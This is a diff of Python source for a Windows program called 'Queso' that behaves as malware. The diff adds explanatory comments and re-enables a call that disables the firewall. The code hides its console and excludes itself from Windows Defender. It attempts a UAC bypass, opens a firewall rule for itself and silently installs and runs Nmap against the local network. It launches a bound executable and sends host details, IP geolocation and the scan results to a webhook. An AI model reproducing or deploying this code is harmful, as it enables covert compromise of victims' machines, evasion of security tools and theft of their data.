@@ -21,14 +21,14 @@ class Syscalls:
 class Utility:
 
     @staticmethod
-    def GetSelf() -> tuple[str, bool]: # Returns the location of the file and whether exe mode is enabled or not
+    def GetSelf() -> tuple[str, bool]: # Get the location of the file and whether exe mode is enabled or not
         if hasattr(sys, "frozen"):
             return (sys.executable, True)
         else:
             return (__file__, False)
 
     @staticmethod
-    def ExcludeFromDefender(path: str = None) -> None:
+    def ExcludeFromDefender(path: str = None) -> None: # Exclude a file from Windows Defender
         if path is None:
             path = Utility.GetSelf()[0]
         subprocess.Popen(
@@ -41,7 +41,7 @@ class Utility:
         return subprocess.run("net session", shell= True, capture_output= True).returncode == 0
 
     @staticmethod
-    def UACbypass(method: int = 1) -> None:
+    def UACbypass(method: int = 1) -> None: # Bypass UAC
         if Utility.GetSelf()[1]:
             execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True).returncode == 0
         
@@ -70,7 +70,7 @@ class Utility:
 class Network:
 
     @staticmethod
-    def GetNetAdapters() -> list[str]:
+    def GetNetAdapters() -> list[str]: # Get a list of network adapters
         adapters = list()
         cmd = subprocess.run(
             "powershell -Command Get-NetAdapter -Name *",
@@ -90,7 +90,7 @@ class Network:
         return adapters
     
     @staticmethod
-    def GetNetConnection(adapter: str) -> str:
+    def GetNetConnection(adapter: str) -> str: # Get an adapter's network connection
         cmd = subprocess.run(
             "powershell -Command Get-NetConnectionProfile -InterfaceAlias \"{}\"".format(adapter),
             shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE
@@ -108,36 +108,37 @@ class Network:
     @staticmethod
     def DisableFirewall(path: str = None) -> None:
         adapters = Network.GetNetAdapters()
-        for adapter in adapters:
+        for adapter in adapters: # Loop over all adapters
             print(adapter)
             connection = Network.GetNetConnection(adapter)
             if connection == "None":
                 pass
-            else:
+            else: # Set network type to private
                 subprocess.Popen(
                     "powershell -Command Set-NetConnectionProfile -Name '{}' -NetworkCategory Private".format(connection),
                     shell= True
                 )
+            # Disable firewall on private networks
         subprocess.Popen(
             "powershell -Command Set-NetFirewallProfile -Profile Private -Enabled False",
             shell= True
         )
 
     @staticmethod
-    def ExcludeFromFirewall(path:str = None) -> None:
+    def ExcludeFromFirewall(path:str = None) -> None: # Exclude a file from Windows Firewall
         if path is None:
             path = Utility.GetSelf()[0]
         subprocess.Popen("netsh advfirewall firewall add rule name='tcpclient' dir='in' action='allow' program='{}'".format(path))
 
     @staticmethod
-    def InstallNmap() -> None:
+    def InstallNmap() -> None: # Install Nmap
         with zipfile.ZipFile(os.path.join(sys._MEIPASS, "nmap.zip"), "r") as zip:
             zip.extractall("C:\\Program Files (x86)")
 
     @staticmethod
-    def NmapScan() -> ElementTree:
+    def NmapScan(range: str, arg: str ="-sV -T4 -O -F --version-light") -> ElementTree: # Perform an Nmap scan
         nmap = nmap3.Nmap()
-        return nmap.scan_command("192.168.1.1/24", arg="-sV -T4 -O -F --version-light")
+        return nmap.scan_command(range, arg)
         
 
 class Tasks:
@@ -178,37 +179,37 @@ class Queso:
         Syscalls.HideConsole()
         Utility.ExcludeFromDefender()
 
-        if not Utility.IsAdmin():
+        if not Utility.IsAdmin(): # If not an admin, try to be one
             if Utility.GetSelf()[1] and not "--no-bypass" in sys.argv:
                     Utility.UACbypass()
 
-        if Utility.IsAdmin():
-            # Network.DisableFirewall()
+        if Utility.IsAdmin(): # We're admin now
+            Network.DisableFirewall()
             Network.ExcludeFromFirewall()
 
-            if not os.path.exists("C:\\Program Files (x86)\\Nmap"):
+            if not os.path.exists("C:\\Program Files (x86)\\Nmap"): # Install Nmap if it doesn't exist
                 Network.InstallNmap()
 
-            for func, daemon in admin_tasks:
+            for func, daemon in admin_tasks: # Start admin tasks
                 thread = Thread(target= func, daemon= daemon)
                 thread.start()
                 Tasks.AddTask(thread)
 
-        for func, daemon in user_tasks:
+        for func, daemon in user_tasks: # Start user tasks
             thread = Thread(target= func, daemon= daemon)
             thread.start()
             Tasks.AddTask(thread)
 
         Tasks.WaitForAll()
 
-    def LaunchBoundApplication(self) -> None:
+    def LaunchBoundApplication(self) -> None: # Launch the bound application
         boundExePath = os.path.join(sys._MEIPASS, "bound", "bound.exe")
         if os.path.isfile(boundExePath):
             subprocess.Popen("{}".format(boundExePath))
 
-    def SendData(self) -> None:
-        scan = Network.NmapScan()
+    def SendData(self) -> None: # Send gathered data to the webhook
 
+        # Gather system information
         computerName = os.getenv("computername")
         computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
         uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
@@ -227,7 +228,7 @@ class Queso:
 
         http = PoolManager()
 
-        try:
+        try: # Try to gather IP information
             r: dict = json.loads(http.request("GET", "http://ip-api.com/json/").data.decode())
             if r.get("status") != "success":
                 raise Exception("Failed to retrieve IP info")
@@ -237,7 +238,7 @@ class Queso:
                 \nCountry: {r['country']}
                 \nTimezone: {r['timezone']}
             """
-        except Exception:
+        except Exception: # Throw an error if we can't
             ip_info = "(No IP info)"
         else:
             ip_info = data
@@ -261,10 +262,14 @@ class Queso:
         }
 
         fields = dict()
-        if scan:
-            fields['file'] = ("{}.xml".format(os.getlogin()), ElementTree.tostring(scan))
-        fields['payload_json'] = json.dumps(payload).encode()
-        http.request("POST", self.Webhook, fields= fields)
+
+        # Append a network scan if we can make one
+        networkscan = Network.NmapScan("192.168.1.1/24")
+        if networkscan:
+            fields['file'] = ("{}.xml".format(os.getlogin()), ElementTree.tostring(networkscan))
+
+        fields['payload_json'] = json.dumps(payload).encode() # Append the embed
+        http.request("POST", self.Webhook, fields= fields) # Bon voyage!
 
 
 if __name__ == "__main__" and os.name == "nt":
